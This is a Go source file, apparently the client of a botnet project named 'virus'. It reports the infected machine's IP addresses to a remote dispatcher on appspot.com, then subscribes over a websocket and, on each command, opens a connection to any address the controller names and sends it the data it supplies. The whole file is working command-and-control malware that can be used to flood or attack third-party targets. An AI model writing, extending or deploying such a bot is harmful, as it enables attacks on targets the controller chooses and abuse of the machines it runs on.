package main

import (
	"bytes"
	"encoding/json"
	"net"
	"net/http"
	"net/url"
	"time"

	"github.com/gorilla/websocket"
	"github.com/jessevdk/go-flags"
	"github.com/kolya59/virus/common/machine"
	"github.com/kolya59/virus/common/models"
)

type options struct {
	DispatcherURL string `long:"dispatcher-host" env:"DISPATCHER" required:"true" default:"trrp-virus.ew.r.appspot.com"`
}

var (
	interval = 5 * time.Minute
)

func sendData(machine machine.Machine, dispatcherHost string) error {
	// Marshal data
	raw, err := json.Marshal(machine)
	if err != nil {
		return err
	}

	// Set up a connection to dispatcher.
	u := url.URL{Scheme: "http", Host: dispatcherHost, Path: "/machine"}
	resp, err := http.Post(u.String(), "application/json", bytes.NewBuffer(raw))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return err
	}
	return nil
}

func subscribeForCommands(dispatcherHost string) error {
	u := url.URL{Scheme: "ws", Host: dispatcherHost, Path: "/subscribe"}

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return err
	}
	defer c.Close()

	var msg models.WSCommand
	for {
		if err := c.ReadJSON(&msg); err != nil {
			return err
		}

		ackMsg := models.WSAck{}

		nc, err := net.Dial(msg.Type, msg.Addr)
		if err != nil {
			ackMsg.Err = err
			nc.Close()
			if err := c.WriteJSON(models.WSAck{Err: err}); err != nil {
				return err
			}
			break
		}

		if _, err := nc.Write(msg.Data); err != nil {
			ackMsg.Err = err
			nc.Close()
			if err := c.WriteJSON(models.WSAck{Err: err}); err != nil {
				return err
			}
			break
		}
		nc.Close()
	}

	return nil
}

func main() {
	var opts options
	if _, err := flags.Parse(&opts); err != nil {
		return
	}
	dispatcherHost := opts.DispatcherURL

	m := machine.Machine{}
	m.GetIPS()

	ticker := time.NewTicker(interval)
	errs := make(chan error, 1)
	errs <- sendData(m, dispatcherHost)
loopSend:
	for {
		select {
		case err := <-errs:
			if err == nil {
				break loopSend
			}
		case <-ticker.C:
			errs <- sendData(m, dispatcherHost)
		}
	}

	errs <- subscribeForCommands(dispatcherHost)
loopSub:
	for {
		select {
		case err := <-errs:
			if err == nil {
				break loopSub
			}
		case <-ticker.C:
			errs <- subscribeForCommands(dispatcherHost)
		}
	}
}
